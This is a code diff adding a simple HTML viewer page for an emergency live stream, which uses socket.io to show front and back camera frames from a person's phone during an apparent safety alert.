@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Emergency Live Stream</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <style>
+        body { font-family: Arial; text-align: center; background-color: #333; color: white; margin: 0; padding: 20px;}
+        img { width: 100%; max-width: 400px; border: 4px solid red; margin-top: 10px; border-radius: 8px; background-color: #000; min-height: 200px;}
+        .container { display: flex; flex-direction: column; align-items: center; }
+    </style>
+</head>
+<body>
+    <h1 style="color: #ff4444;">🚨 LIVE EMERGENCY STREAM 🚨</h1>
+    <p>Viewing live footage from the victim's phone.</p>
+    <div class="container">
+        <div>
+            <h3>Front Camera</h3>
+            <img id="front-view" src="" alt="Waiting for stream or camera blocked..." />
+        </div>
+        <div>
+            <h3>Back Camera</h3>
+            <img id="back-view" src="" alt="Waiting for stream or camera blocked..." />
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        socket.on('stream_frame', (data) => {
+            if (data.camera === 'front') {
+                document.getElementById('front-view').src = data.image;
+            } else if (data.camera === 'back') {
+                document.getElementById('back-view').src = data.image;
+            }
+        });
+    </script>
+</body>
+</html>
